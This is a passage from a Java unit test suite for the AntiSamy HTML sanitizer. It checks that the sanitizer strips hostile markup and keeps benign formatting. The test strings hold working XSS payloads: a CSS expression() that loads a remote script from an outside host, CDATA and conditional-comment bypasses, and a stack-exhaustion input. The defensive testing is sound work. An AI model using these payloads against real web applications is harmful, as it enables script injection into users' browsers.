AntiSamy.DOM).getCleanHTML().contains(\"document\"));\n        assertTrue(!as.scan(\"<a></a style=\\\"\\\"xx:expr/**/ession(document.appendChild(document.createElement('script')).src='http://h4k.in/i.js')\\\">\", policy, AntiSamy.SAX).getCleanHTML().contains(\"document\"));\n    }\n\n    /*\n     * Test CSS protections.\n     */\n\n    @Test\n    public void cssAttacks() throws ScanException, PolicyException {\n\n        assertTrue(!as.scan(\"<div style=\\\"position:absolute\\\">\", policy, AntiSamy.DOM).getCleanHTML().contains(\"position\"));\n        assertTrue(!as.scan(\"<div style=\\\"position:absolute\\\">\", policy, AntiSamy.SAX).getCleanHTML().contains(\"position\"));\n\n        assertTrue(!as.scan(\"<style>b { position:absolute }</style>\", policy, AntiSamy.DOM).getCleanHTML().contains(\"position\"));\n        assertTrue(!as.scan(\"<style>b { position:absolute }</style>\", policy, AntiSamy.SAX).getCleanHTML().contains(\"position\"));\n\n        assertTrue(!as.scan(\"<div style=\\\"z-index:25\\\">test</div>\", policy, AntiSamy.DOM).getCleanHTML().contains(\"z-index\"));\n        assertTrue(!as.scan(\"<div style=\\\"z-index:25\\\">test</div>\", policy, AntiSamy.SAX).getCleanHTML().contains(\"z-index\"));\n\n        assertTrue(!as.scan(\"<style>z-index:25</style>\", policy, AntiSamy.DOM).getCleanHTML().contains(\"z-index\"));\n        assertTrue(!as.scan(\"<style>z-index:25</style>\", policy, AntiSamy.SAX).getCleanHTML().contains(\"z-index\"));\n    }\n\n    /*\n     * Test a bunch of strings that have tweaked the XML parsing capabilities of\n     * NekoHTML.\n     */\n    @Test\n    public void IllegalXML() throws PolicyException {\n\n        for (String BASE64_BAD_XML_STRING : BASE64_BAD_XML_STRINGS) {\n\n            try {\n                String testStr = new String(Base64.decodeBase64(BASE64_BAD_XML_STRING.getBytes()));\n                as.scan(testStr, policy, AntiSamy.DOM);\n                as.scan(testStr, policy, AntiSamy.SAX);\n\n            } catch (ScanException ex) {\n                // still success!\n            }\n        }\n\n        // This fails due to a bug in NekoHTML\n        // try {\n        // assertTrue (\n        // as.scan(\"<a . href=\\\"http://www.test.com\\\">\",policy, AntiSamy.DOM).getCleanHTML().indexOf(\"href\")\n        // != -1 );\n        // } catch (Exception e) {\n        // e.printStackTrace();\n        // fail(\"Couldn't parse malformed HTML: \" + e.getMessage());\n        // }\n\n        // This fails due to a bug in NekoHTML\n        // try {\n        // assertTrue (\n        // as.scan(\"<a - href=\\\"http://www.test.com\\\">\",policy, AntiSamy.DOM).getCleanHTML().indexOf(\"href\")\n        // != -1 );\n        // } catch (Exception e) {\n        // e.printStackTrace();\n        // fail(\"Couldn't parse malformed HTML: \" + e.getMessage());\n        // }\n\n        try {\n            assertTrue(as.scan(\"<style>\", policy, AntiSamy.DOM) != null);\n        } catch (Exception e) {\n            e.printStackTrace();\n            fail(\"Couldn't parse malformed HTML: \" + e.getMessage());\n        }\n    }\n\n    @Test\n    public void issue12() throws ScanException, PolicyException {\n\n        /*\n         * issues 12 (and 36, which was similar). empty tags cause display\n         * problems/\"formjacking\"\n         */\n\n        Pattern p = Pattern.compile(\".*<strong(\\\\s*)/>.*\");\n        String s1 = as.scan(\"<br ><strong></strong><a>hello world</a><b /><i/><hr>\", policy, AntiSamy.DOM).getCleanHTML();\n        String s2 = as.scan(\"<br ><strong></strong><a>hello world</a><b /><i/><hr>\", policy, AntiSamy.SAX).getCleanHTML();\n\n        assertFalse(p.matcher(s1).matches());\n\n        p = Pattern.compile(\".*<b(\\\\s*)/>.*\");\n        assertFalse(p.matcher(s1).matches());\n        assertFalse(p.matcher(s2).matches());\n\n        p = Pattern.compile(\".*<i(\\\\s*)/>.*\");\n        assertFalse(p.matcher(s1).matches());\n        assertFalse(p.matcher(s2).matches());\n\n        assertTrue(s1.contains(\"<hr />\") || s1.contains(\"<hr/>\"));\n        assertTrue(s2.contains(\"<hr />\") || s2.contains(\"<hr/>\"));\n    }\n\n    @Test\n    public void issue20() throws ScanException, PolicyException {\n        String s = as.scan(\"<b><i>Some Text</b></i>\", policy, AntiSamy.DOM).getCleanHTML();\n        assertTrue(!s.contains(\"<i />\"));\n\n        s = as.scan(\"<b><i>Some Text</b></i>\", policy, AntiSamy.SAX).getCleanHTML();\n        assertTrue(!s.contains(\"<i />\"));\n    }\n\n    @Test\n    public void issue25() throws ScanException, PolicyException {\n        String s = \"<div style=\\\"margin: -5em\\\">Test</div>\";\n        String expected = \"<div style=\\\"\\\">Test</div>\";\n\n        String crDom = as.scan(s, policy, AntiSamy.DOM).getCleanHTML();\n        assertEquals(crDom, expected);\n        String crSax = as.scan(s, policy, AntiSamy.SAX).getCleanHTML();\n        assertEquals(crSax, expected);\n    }\n\n\n    @Test\n    public void issue28() throws ScanException, PolicyException {\n        String s1 = as.scan(\"<div style=\\\"font-family: Geneva, Arial, courier new, sans-serif\\\">Test</div>\", policy, AntiSamy.DOM).getCleanHTML();\n        String s2 = as.scan(\"<div style=\\\"font-family: Geneva, Arial, courier new, sans-serif\\\">Test</div>\", policy, AntiSamy.SAX).getCleanHTML();\n        assertTrue(s1.contains(\"font-family\"));\n        assertTrue(s2.contains(\"font-family\"));\n    }\n\n    @Test\n    public void issue29() throws ScanException, PolicyException {\n        /* issue #29 - missing quotes around properties with spaces */\n        String s = \"<style type=\\\"text/css\\\"><![CDATA[P {\\n\tfont-family: \\\"Arial Unicode MS\\\";\\n}\\n]]></style>\";\n        CleanResults cr = as.scan(s, policy, AntiSamy.DOM);\n        assertEquals(s, cr.getCleanHTML());\n    }\n\n    @Test\n    public void issue30() throws ScanException, PolicyException {\n\n        String s = \"<style type=\\\"text/css\\\"><![CDATA[P { margin-bottom: 0.08in; } ]]></style>\";\n\n        as.scan(s, policy, AntiSamy.DOM);\n        CleanResults cr;\n\n        /* followup - does the patch fix multiline CSS? */\n        String s2 = \"<style type=\\\"text/css\\\"><![CDATA[\\r\\nP {\\r\\n margin-bottom: 0.08in;\\r\\n}\\r\\n]]></style>\";\n        cr = as.scan(s2, policy, AntiSamy.DOM);\n        assertEquals(\"<style type=\\\"text/css\\\"><![CDATA[P {\\n\\tmargin-bottom: 0.08in;\\n}\\n]]></style>\", cr.getCleanHTML());\n\n        /* next followup - does non-CDATA parsing still work? */\n\n        String s3 = \"<style>P {\\n\\tmargin-bottom: 0.08in;\\n}\\n\";\n        cr = as.scan(s3, policy.cloneWithDirective(Policy.USE_XHTML, \"false\"), AntiSamy.DOM);\n        assertEquals(\"<style>P {\\n\\tmargin-bottom: 0.08in;\\n}\\n</style>\\n\", cr.getCleanHTML());\n    }\n\n    @Test\n    public void issue31() throws ScanException, PolicyException {\n\n        String test = \"<b><u><g>foo</g></u></b>\";\n        Policy revised = policy.cloneWithDirective(\"onUnknownTag\", \"encode\");\n        CleanResults cr = as.scan(test, revised, AntiSamy.DOM);\n        String s = cr.getCleanHTML();\n        assertFalse(!s.contains(\"&lt;g&gt;\"));\n        assertFalse(!s.contains(\"&lt;/g&gt;\"));\n        s = as.scan(test, revised, AntiSamy.SAX).getCleanHTML();\n        assertFalse(!s.contains(\"&lt;g&gt;\"));\n        assertFalse(!s.contains(\"&lt;/g&gt;\"));\n\n        Tag tag = policy.getTagByLowercaseName(\"b\").mutateAction(\"encode\");\n        Policy policy1 = policy.mutateTag(tag);\n\n        cr = as.scan(test, policy1, AntiSamy.DOM);\n        s = cr.getCleanHTML();\n\n        assertFalse(!s.contains(\"&lt;b&gt;\"));\n        assertFalse(!s.contains(\"&lt;/b&gt;\"));\n\n        cr = as.scan(test, policy1, AntiSamy.SAX);\n        s = cr.getCleanHTML();\n\n        assertFalse(!s.contains(\"&lt;b&gt;\"));\n        assertFalse(!s.contains(\"&lt;/b&gt;\"));\n    }\n\n    @Test\n    public void issue32() throws ScanException, PolicyException {\n        /* issue #32 - nekos problem */\n        String s = \"<SCRIPT =\\\">\\\" SRC=\\\"\\\"></SCRIPT>\";\n        as.scan(s, policy, AntiSamy.DOM);\n        as.scan(s, policy, AntiSamy.SAX);\n    }\n\n    @Test\n    public void issue37() throws ScanException, PolicyException {\n\n        String dirty = \"<a onblur=\\\"try {parent.deselectBloggerImageGracefully();}\" + \"catch(e) {}\\\"\"\n                + \"href=\\\"http://www.charityadvantage.com/ChildrensmuseumEaston/images/BookswithBill.jpg\\\"><img\" + \"style=\\\"FLOAT: right; MARGIN: 0px 0px 10px 10px; WIDTH: 150px; CURSOR:\"\n                + \"hand; HEIGHT: 100px\\\" alt=\\\"\\\"\" + \"src=\\\"http://www.charityadvantage.com/ChildrensmuseumEaston/images/BookswithBill.jpg\\\"\"\n                + \"border=\\\"0\\\" /></a><br />Poor Bill, couldn't make it to the Museum's <span\" + \"class=\\\"blsp-spelling-corrected\\\" id=\\\"SPELLING_ERROR_0\\\">story time</span>\"\n                + \"today, he was so busy shoveling! Well, we sure missed you Bill! So since\" + \"ou were busy moving snow we read books about snow. We found a clue in one\"\n                + \"book which revealed a snowplow at the end of the story - we wish it had\" + \"driven to your driveway Bill. We also read a story which shared fourteen\"\n                + \"<em>Names For Snow. </em>We'll catch up with you next week....wonder which\" + \"hat Bill will wear?<br />Jane\";\n\n        Policy mySpacePolicy = Policy.getInstance(getClass().getResource(\"/antisamy-myspace.xml\"));\n        CleanResults cr = as.scan(dirty, mySpacePolicy, AntiSamy.DOM);\n        assertNotNull(cr.getCleanHTML());\n        cr = as.scan(dirty, mySpacePolicy, AntiSamy.SAX);\n        assertNotNull(cr.getCleanHTML());\n\n        Policy ebayPolicy = Policy.getInstance(getClass().getResource(\"/antisamy-ebay.xml\"));\n        cr = as.scan(dirty, ebayPolicy, AntiSamy.DOM);\n        assertNotNull(cr.getCleanHTML());\n        cr = as.scan(dirty, mySpacePolicy, AntiSamy.SAX);\n        assertNotNull(cr.getCleanHTML());\n\n        Policy slashdotPolicy = Policy.getInstance(getClass().getResource(\"/antisamy-slashdot.xml\"));\n        cr = as.scan(dirty, slashdotPolicy, AntiSamy.DOM);\n        assertNotNull(cr.getCleanHTML());\n        cr = as.scan(dirty, slashdotPolicy, AntiSamy.SAX);\n        assertNotNull(cr.getCleanHTML());\n    }\n\n    @Test\n    public void issue38() throws ScanException, PolicyException {\n\n        /* issue #38 - color problem/color combinations */\n        String s = \"<font color=\\\"#fff\\\">Test</font>\";\n        String expected = \"<font color=\\\"#fff\\\">Test</font>\";\n        assertEquals(as.scan(s, policy, AntiSamy.DOM).getCleanHTML(), expected);\n        assertEquals(as.scan(s, policy, AntiSamy.SAX).getCleanHTML(), expected);\n\n        s = \"<div style=\\\"color: #fff\\\">Test 3 letter code</div>\";\n        expected = \"<div style=\\\"color: rgb(255,255,255);\\\">Test 3 letter code</div>\";\n        assertEquals(as.scan(s, policy, AntiSamy.DOM).getCleanHTML(), expected);\n        assertEquals(as.scan(s, policy, AntiSamy.SAX).getCleanHTML(), expected);\n\n        s = \"<font color=\\\"red\\\">Test</font>\";\n        expected = \"<font color=\\\"red\\\">Test</font>\";\n        assertEquals(as.scan(s, policy, AntiSamy.DOM).getCleanHTML(), expected);\n        assertEquals(as.scan(s, policy, AntiSamy.SAX).getCleanHTML(), expected);\n\n        s = \"<font color=\\\"neonpink\\\">Test</font>\";\n        expected = \"<font>Test</font>\";\n        assertEquals(as.scan(s, policy, AntiSamy.DOM).getCleanHTML(), expected);\n        assertEquals(as.scan(s, policy, AntiSamy.SAX).getCleanHTML(), expected);\n\n        s = \"<font color=\\\"#0000\\\">Test</font>\";\n        expected = \"<font>Test</font>\";\n        assertEquals(as.scan(s, policy, AntiSamy.DOM).getCleanHTML(), expected);\n        assertEquals(as.scan(s, policy, AntiSamy.SAX).getCleanHTML(), expected);\n\n        s = \"<div style=\\\"color: #0000\\\">Test</div>\";\n        expected = \"<div style=\\\"\\\">Test</div>\";\n        assertEquals(as.scan(s, policy, AntiSamy.DOM).getCleanHTML(), expected);\n        assertEquals(as.scan(s, policy, AntiSamy.SAX).getCleanHTML(), expected);\n\n        s = \"<font color=\\\"#000000\\\">Test</font>\";\n        expected = \"<font color=\\\"#000000\\\">Test</font>\";\n        assertEquals(as.scan(s, policy, AntiSamy.DOM).getCleanHTML(), expected);\n        assertEquals(as.scan(s, policy, AntiSamy.SAX).getCleanHTML(), expected);\n\n        s = \"<div style=\\\"color: #000000\\\">Test</div>\";\n        expected = \"<div style=\\\"color: rgb(0,0,0);\\\">Test</div>\";\n        assertEquals(as.scan(s, policy, AntiSamy.DOM).getCleanHTML(), expected);\n        assertEquals(as.scan(s, policy, AntiSamy.SAX).getCleanHTML(), expected);\n\n        /*\n        * This test case was failing because of the following code from the\n        * batik CSS library, which throws an exception if any character\n        * other than a '!' follows a beginning token of '<'. The\n        * ParseException is now caught in the node a CssScanner.java and\n        * the outside AntiSamyDOMScanner.java.\n        *\n        * 0398 nextChar(); 0399 if (current != '!') { 0400 throw new\n        * ParseException(\"character\", 0401 reader.getLine(), 0402\n        * reader.getColumn());\n        */\n        s = \"<b><u>foo<style><script>alert(1)</script></style>@import 'x';</u>bar\";\n        as.scan(s, policy, AntiSamy.DOM);\n        as.scan(s, policy, AntiSamy.SAX);\n    }\n\n    @Test\n    public void issue40() throws ScanException, PolicyException {\n\n        /* issue #40 - handling <style> media attributes right */\n\n        String s = \"<style media=\\\"print, projection, screen\\\"> P { margin: 1em; }</style>\";\n        Policy revised = policy.cloneWithDirective(Policy.PRESERVE_SPACE, \"true\");\n\n        CleanResults cr = as.scan(s, revised, AntiSamy.DOM);\n        assertTrue(cr.getCleanHTML().contains(\"print, projection, screen\"));\n\n        cr = as.scan(s, revised, AntiSamy.SAX);\n        assertTrue(cr.getCleanHTML().contains(\"print, projection, screen\"));\n    }\n\n    @Test\n    public void issue41() throws ScanException, PolicyException {\n        /* issue #41 - comment handling */\n\n        Policy revised = policy.cloneWithDirective(Policy.PRESERVE_SPACE, \"true\");\n\n        policy.cloneWithDirective(Policy.PRESERVE_COMMENTS, \"false\");\n\n        assertEquals(\"text \", as.scan(\"text <!-- comment -->\", revised, AntiSamy.DOM).getCleanHTML());\n        assertEquals(\"text \", as.scan(\"text <!-- comment -->\", revised, AntiSamy.SAX).getCleanHTML());\n\n        Policy revised2 = policy.cloneWithDirective(Policy.PRESERVE_COMMENTS, \"true\").cloneWithDirective(Policy.PRESERVE_SPACE, \"true\").cloneWithDirective(Policy.FORMAT_OUTPUT, \"false\");\n\n        /*\n        * These make sure the regular comments are kept alive and that\n        * conditional comments are ripped out.\n        */\n        assertEquals(\"<div>text <!-- comment --></div>\", as.scan(\"<div>text <!-- comment --></div>\", revised2, AntiSamy.DOM).getCleanHTML());\n        assertEquals(\"<div>text <!-- comment --></div>\", as.scan(\"<div>text <!-- comment --></div>\", revised2, AntiSamy.SAX).getCleanHTML());\n\n        assertEquals(\"<div>text <!-- comment --></div>\", as.scan(\"<div>text <!--[if IE]> comment <[endif]--></div>\", revised2, AntiSamy.DOM).getCleanHTML());\n        assertEquals(\"<div>text <!-- comment --></div>\", as.scan(\"<div>text <!--[if IE]> comment <[endif]--></div>\", revised2, AntiSamy.SAX).getCleanHTML());\n\n        /*\n        * Check to see how nested conditional comments are handled. This is\n        * not very clean but the main goal is to avoid any tags. Not sure\n        * on encodings allowed in comments.\n        */\n        String input = \"<div>text <!--[if IE]> <!--[if gte 6]> comment <[endif]--><[endif]--></div>\";\n        String expected = \"<div>text <!-- <!-- comment -->&lt;[endif]--&gt;</div>\";\n        String output = as.scan(input, revised2, AntiSamy.DOM).getCleanHTML();\n        assertEquals(expected, output);\n\n        input = \"<div>text <!--[if IE]> <!--[if gte 6]> comment <[endif]--><[endif]--></div>\";\n        expected = \"<div>text <!-- <!-- comment -->&lt;[endif]--&gt;</div>\";\n        output = as.scan(input, revised2, AntiSamy.SAX).getCleanHTML();\n\n        assertEquals(expected, output);\n\n        /*\n        * Regular comment nested inside conditional comment. Test makes\n        * sure\n        */\n        assertEquals(\"<div>text <!-- <!-- IE specific --> comment &lt;[endif]--&gt;</div>\", as.scan(\"<div>text <!--[if IE]> <!-- IE specific --> comment <[endif]--></div>\", revised2, AntiSamy.DOM).getCleanHTML());\n\n        /*\n        * These play with whitespace and have invalid comment syntax.\n        */\n        assertEquals(\"<div>text <!-- \\ncomment --></div>\", as.scan(\"<div>text <!-- [ if lte 6 ]>\\ncomment <[ endif\\n]--></div>\", revised2, AntiSamy.DOM).getCleanHTML());\n        assertEquals(\"<div>text  comment </div>\", as.scan(\"<div>text <![if !IE]> comment <![endif]></div>\", revised2, AntiSamy.DOM).getCleanHTML());\n        assertEquals(\"<div>text  comment </div>\", as.scan(\"<div>text <![ if !IE]> comment <![endif]></div>\", revised2, AntiSamy.DOM).getCleanHTML());\n\n        String attack = \"[if lte 8]<script>\";\n        String spacer = \"<![if IE]>\";\n\n        StringBuilder sb = new StringBuilder();\n\n        sb.append(\"<div>text<!\");\n\n        for (int i = 0; i < attack.length(); i++) {\n            sb.append(attack.charAt(i));\n            sb.append(spacer);\n        }\n\n        sb.append(\"<![endif]>\");\n\n        String s = sb.toString();\n\n        assertTrue(!as.scan(s, revised2, AntiSamy.DOM).getCleanHTML().contains(\"<script\"));\n        assertTrue(!as.scan(s, revised2, AntiSamy.SAX).getCleanHTML().contains(\"<script\"));\n    }\n\n    @Test\n    public void issue44() throws ScanException, PolicyException {\n        /*\n         * issue #44 - childless nodes of non-allowed elements won't cause an error\n         */\n        String s = \"<iframe src='http://foo.com/'></iframe>\" + \"<script src=''></script>\" + \"<link href='/foo.css'>\";\n        as.scan(s, policy, AntiSamy.DOM);\n        assertEquals(as.scan(s, policy, AntiSamy.DOM).getNumberOfErrors(), 3);\n\n        CleanResults cr = as.scan(s, policy, AntiSamy.SAX);\n\n        assertEquals(cr.getNumberOfErrors(), 3);\n    }\n\n    @Test\n    public void issue51() throws ScanException, PolicyException {\n        /* issue #51 - offsite URLs with () are found to be invalid */\n        String s = \"<a href='http://subdomain.domain/(S(ke0lpq54bw0fvp53a10e1a45))/MyPage.aspx'>test</a>\";\n        CleanResults cr = as.scan(s, policy, AntiSamy.DOM);\n\n        assertEquals(cr.getNumberOfErrors(), 0);\n\n        cr = as.scan(s, policy, AntiSamy.SAX);\n        assertEquals(cr.getNumberOfErrors(), 0);\n    }\n\n    @Test\n    public void issue56() throws ScanException, PolicyException {\n        /* issue #56 - unnecessary spaces */\n\n        String s = \"<SPAN style='font-weight: bold;'>Hello World!</SPAN>\";\n        String expected = \"<span style=\\\"font-weight: bold;\\\">Hello World!</span>\";\n\n        CleanResults cr = as.scan(s, policy, AntiSamy.DOM);\n        String s2 = cr.getCleanHTML();\n\n        assertEquals(expected, s2);\n\n        cr = as.scan(s, policy, AntiSamy.SAX);\n        s2 = cr.getCleanHTML();\n\n        assertEquals(expected, s2);\n    }\n\n    @Test\n    public void issue58() throws ScanException, PolicyException {\n        /* issue #58 - input not in list of allowed-to-be-empty tags */\n        String s = \"tgdan <input/> g  h\";\n        CleanResults cr = as.scan(s, policy, AntiSamy.DOM);\n        assertTrue(cr.getErrorMessages().size() == 0);\n\n        cr = as.scan(s, policy, AntiSamy.SAX);\n        assertTrue(cr.getErrorMessages().size() == 0);\n    }\n\n    @Test\n    public void issue61() throws ScanException, PolicyException {\n        /* issue #61 - input has newline appended if ends with an accepted tag */\n        String dirtyInput = \"blah <b>blah</b>.\";\n        Policy revised = policy.cloneWithDirective(Policy.FORMAT_OUTPUT, \"false\");\n        CleanResults cr = as.scan(dirtyInput, revised, AntiSamy.DOM);\n        assertEquals(dirtyInput, cr.getCleanHTML());\n\n        cr = as.scan(dirtyInput, revised, AntiSamy.SAX);\n        assertEquals(dirtyInput, cr.getCleanHTML());\n    }\n\n    @Test\n    public void issue69() throws ScanException, PolicyException {\n\n        /* issue #69 - char attribute should allow single char or entity ref */\n\n        String s = \"<table><tr><td char='.'>test</td></tr></table>\";\n        CleanResults crDom = as.scan(s, policy, AntiSamy.DOM);\n        CleanResults crSax = as.scan(s, policy, AntiSamy.SAX);\n        String domValue = crDom.getCleanHTML();\n        String saxValue = crSax.getCleanHTML();\n        assertTrue(domValue.contains(\"char\"));\n        assertTrue(saxValue.contains(\"char\"));\n\n        s = \"<table><tr><td char='..'>test</td></tr></table>\";\n        assertTrue(!as.scan(s, policy, AntiSamy.DOM).getCleanHTML().contains(\"char\"));\n        assertTrue(!as.scan(s, policy, AntiSamy.SAX).getCleanHTML().contains(\"char\"));\n\n        s = \"<table><tr><td char='&quot;'>test</td></tr></table>\";\n        assertTrue(as.scan(s, policy, AntiSamy.DOM).getCleanHTML().contains(\"char\"));\n        assertTrue(as.scan(s, policy, AntiSamy.SAX).getCleanHTML().contains(\"char\"));\n\n        s = \"<table><tr><td char='&quot;a'>test</td></tr></table>\";\n        assertTrue(!as.scan(s, policy, AntiSamy.DOM).getCleanHTML().contains(\"char\"));\n        assertTrue(!as.scan(s, policy, AntiSamy.SAX).getCleanHTML().contains(\"char\"));\n\n        s = \"<table><tr><td char='&quot;&amp;'>test</td></tr></table>\";\n        assertTrue(!as.scan(s, policy, AntiSamy.DOM).getCleanHTML().contains(\"char\"));\n        assertTrue(!as.scan(s, policy, AntiSamy.SAX).getCleanHTML().contains(\"char\"));\n    }\n\n    @Test\n    public void CDATAByPass() throws ScanException, PolicyException {\n        String malInput = \"<![CDATA[]><script>alert(1)</script>]]>\";\n        CleanResults crd = as.scan(malInput, policy, AntiSamy.DOM);\n        CleanResults crs = as.scan(malInput, policy, AntiSamy.SAX);\n        String crDom = crd.getCleanHTML();\n        String crSax = crs.getCleanHTML();\n\n        assertTrue(crd.getErrorMessages().size() > 0);\n        assertTrue(crs.getErrorMessages().size() > 0);\n\n        assertTrue(crSax.contains(\"&lt;script\") && !crDom.contains(\"<script\"));\n        assertTrue(crDom.contains(\"&lt;script\") && !crDom.contains(\"<script\"));\n    }\n\n    @Test\n    public void literalLists() throws ScanException, PolicyException {\n\n        /* this test is for confirming literal-lists work as\n         * advertised. it turned out to be an invalid / non-\n         * reproducible bug report but the test seemed useful\n         * enough to keep.\n         */\n        String malInput = \"hello<p align='invalid'>world</p>\";\n\n        CleanResults crd = as.scan(malInput, policy, AntiSamy.DOM);\n        String crDom = crd.getCleanHTML();\n        CleanResults crs = as.scan(malInput, policy, AntiSamy.SAX);\n        String crSax = crs.getCleanHTML();\n\n        assertTrue(!crSax.contains(\"invalid\"));\n        assertTrue(!crDom.contains(\"invalid\"));\n\n        assertTrue(crd.getErrorMessages().size() == 1);\n        assertTrue(crs.getErrorMessages().size() == 1);\n\n        String goodInput = \"hello<p align='left'>world</p>\";\n        crDom = as.scan(goodInput, policy, AntiSamy.DOM).getCleanHTML();\n        crSax = as.scan(goodInput, policy, AntiSamy.SAX).getCleanHTML();\n\n        assertTrue(crSax.contains(\"left\"));\n        assertTrue(crDom.contains(\"left\"));\n    }\n\n    @Test\n    public void stackExhaustion() throws ScanException, PolicyException {\n        /*\n        * Test Julian Cohen's stack exhaustion bug.\n        */\n\n        StringBuilder sb = new StringBuilder();\n        for (int i = 0; i < 249; i++) {\n            sb.append(\"<div>\");\n        }\n        /*\n        * First, make sure this attack is useless against the\n        * SAX parser.\n        */\n        as.scan(sb.toString(), policy, AntiSamy.SAX);\n\n        /*\n        * Scan this really deep tree (depth=249, 1 less than the\n        * max) and make sure it doesn't blow up.\n        */\n\n        CleanResults crd = as.scan(sb.toString(), policy, AntiSamy.DOM);\n\n        String crDom = crd.getCleanHTML();\n        assertTrue(crDom.length() != 0);\n        /*\n        * Now push it over the limit to 251 and make sure we blow\n        * up safely.\n        */\n        sb.append(\"<div><div>\"); // this makes 251\n\n        try {\n            as.scan(sb.toString(), policy, AntiSamy.DOM);\n            fail(\"DOM depth exceeded max - should've errored\");\n        } catch (ScanException e) {\n            // An error is expected. Pass\n        }\n    }\n\n    @Test\n    public void issue107() throws ScanException, PolicyException {\n        StringBuilder sb = new StringBuilder();\n\n        /*\n         * #107 - erroneous newlines appearing? couldn't reproduce this\n         * error but the test seems worthy of keeping.\n         */\n        String nl = \"\\n\";\n\n        String header = \"<h1>Header</h1>\";\n        String para = \"<p>Paragraph</p>\";\n        sb.append(header);\n        sb.append(nl);\n        sb.append(para);\n\n        String html = sb.toString();\n\n        String crDom = as.scan(html, policy, AntiSamy.DOM).getCleanHTML();\n        String crSax = as.scan(html, policy, AntiSamy.SAX).getCleanHTML();\n\n        /* Make sure only 1 newline appears */\n        assertTrue(crDom.lastIndexOf(nl) == crDom.indexOf(nl));\n        assertTrue(crSax.lastIndexOf(nl) == crSax.indexOf(nl));\n\n        int expectedLoc = header.length();\n        int actualLoc = crSax.indexOf(nl);\n        assertTrue(expectedLoc == actualLoc);\n\n        actualLoc = crDom.indexOf(nl);\n        // account for line separator length difference across OSes.\n        assertTrue(expectedLoc == actualLoc || expectedLoc == actualLoc + 1);\n    }\n\n    @Test\n    public void issue112() throws ScanException, PolicyException {\n        TestPolicy revised = policy.cloneWithDirective(Policy.PRESERVE_COMMENTS, \"true\").cloneWithDirective(Policy.PRESERVE_SPACE, \"true\").cloneWithDirective(Policy.FORMAT_OUTPUT, \"false\");\n\n        /*\n        * #112 - empty tag becomes self closing\n        */\n\n        String html = \"text <strong></strong> text <strong><em></em></strong> text\";\n\n        String crDom = as.scan(html, revised, AntiSamy.DOM).getCleanHTML();\n        String crSax = as.scan(html, revised, AntiSamy.SAX).getCleanHTML();\n\n        assertTrue(!crDom.contains(\"<strong />\") && !crDom.contains(\"<strong/>\"));\n        assertTrue(!crSax.contains(\"<strong />\") && !crSax.contains(\"<strong/>\"));\n\n        StringBuilder sb = new StringBuilder();\n        sb.append(\"<html><head><title>foobar</title></head><body>\");\n        sb.append(\"<img src=\\\"http://foobar.com/pic.gif\\\" /></body></html>\");\n\n        html = sb.toString();\n\n        Policy aTrue = revised.cloneWithDirective(Policy.USE_XHTML, \"true\");\n        crDom = as.scan(html, aTrue, AntiSamy.DOM).getCleanHTML();\n        crSax = as.scan(html, aTrue, AntiSamy.SAX).getCleanHTML();\n\n        assertTrue(html.equals(crDom));\n        assertTrue(html.equals(crSax));\n    }\n\n\n    @Test\n    public void nestedCdataAttacks() throws ScanException, PolicyException {\n\n        /*\n        * Testing for nested CDATA attacks against the SAX parser.\n        */\n\n        String html = \"<![CDATA[]><script>alert(1)</script><![CDATA[]>]]><script>alert(2)</script>>]]>\";\n        String crDom = as.scan(html, policy, AntiSamy.DOM).getCleanHTML();\n        String crSax = as.scan(html, policy, AntiSamy.SAX).getCleanHTML();\n        assertTrue(!crDom.contains(\"<script>\"));\n        assertTrue(!crSax.contains(\"<script>\"));\n    }\n\n    @Test\n    public void issue101InternationalCharacterSupport() throws ScanException, PolicyException {\n        Policy revised = policy.cloneWithDirective(Policy.ENTITY_ENCODE_INTL_CHARS, \"false\");\n\n        String html = \"<b>letter 'a' with umlaut: \\u00e4\";\n        String crDom = as.scan(html, revised, AntiSamy.DOM).getCleanHTML();\n        String crSax = as.scan(html, revised, AntiSamy.SAX).getCleanHTML();\n        assertTrue(crDom.contains(\"\\u00e4\"));\n        assertTrue(crSax.contains(\"\\u00e4\"));\n\n        Policy revised2 = policy.cloneWithDirective(Policy.USE_XHTML, \"false\").cloneWithDirective(Policy.ENTITY_ENCODE_INTL_CHARS, \"true\");\n        crDom = as.scan(html, revised2, AntiSamy.DOM).getCleanHTML();\n        crSax = as.scan(html, revised2, AntiSamy.SAX).getCleanHTML();\n        assertTrue(!crDom.contains(\"\\u00e4\"));\n        assertTrue(crDom.contains(\"&auml;\"));\n        assertTrue(!crSax.contains(\"\\u00e4\"));\n        assertTrue(crSax.contains(\"&auml;\"));\n\n        Policy revised3 = policy.cloneWithDirective(Policy.USE_XHTML, \"true\").cloneWithDirective(Policy.ENTITY_ENCODE_INTL_CHARS, \"true\");\n        crDom = as.scan(html, revised3, AntiSamy.DOM).getCleanHTML();\n        crSax = as.scan(html, revised3, AntiSamy.SAX).getCleanHTML();\n        assertTrue(!crDom.contains(\"\\u00e4\"));\n        assertTrue(crDom.contains(\"&auml;\"));\n        assertTrue(!crSax.contains(\"\\u00e4\"));\n        assertTrue(crSax.contains(\"&auml;\"));\n    }\n\n    @Test\n    public void iframeAsReportedByOndrej() throws ScanException, PolicyException {\n        String html = \"<iframe></iframe>\";\n\n        Tag tag = new Tag(\"iframe\", Collections.<String, Attribute>emptyMap(), Policy.ACTION_VALIDATE);\n        Policy revised = policy.addTagRule(tag);\n\n        String crDom = as.scan(html, revised, AntiSamy.DOM).getCleanHTML();\n        String crSax = as.scan(html, revised, AntiSamy.SAX).getCleanHTML();\n\n        assertTrue(html.equals(crDom));\n        assertTrue(html.equals(crSax));\n    }\n\n    /*\n\t * Tests cases dealing with nofollowAnchors directive. Assumes anchor tags\n\t * have an action set to \"validate\" (may be implicit) in the policy file.\n\t */\n    @Test\n    public void nofollowAnchors() throws ScanException, PolicyException {\n\n        // if we have activated nofollowAnchors\n        Policy revisedPolicy = policy.cloneWithDirective(Policy.ANCHORS_NOFOLLOW, \"true\");\n\n        // adds when not present\n        assertTrue(as.scan(\"<a href=\\\"blah\\\">link</a>\", revisedPolicy, AntiSamy.DOM).getCleanHTML().contains(\"<a href=\\\"blah\\\" rel=\\\"nofollow\\\">link</a>\"));\n        assertTrue(as.scan(\"<a href=\\\"blah\\\">link</a>\", revisedPolicy, AntiSamy.SAX).getCleanHTML().contains(\"<a href=\\\"blah\\\" rel=\\\"nofollow\\\">link</a>\"));\n\n        // adds properly even with bad attr\n        assertTrue(as.scan(\"<a href=\\\"blah\\\" bad=\\\"true\\\">link</a>\", revisedPolicy, AntiSamy.DOM).getCleanHTML().contains(\"<a href=\\\"blah\\\" rel=\\\"nofollow\\\">link</a>\"));\n        assertTrue(as.scan(\"<a href=\\\"blah\\\" 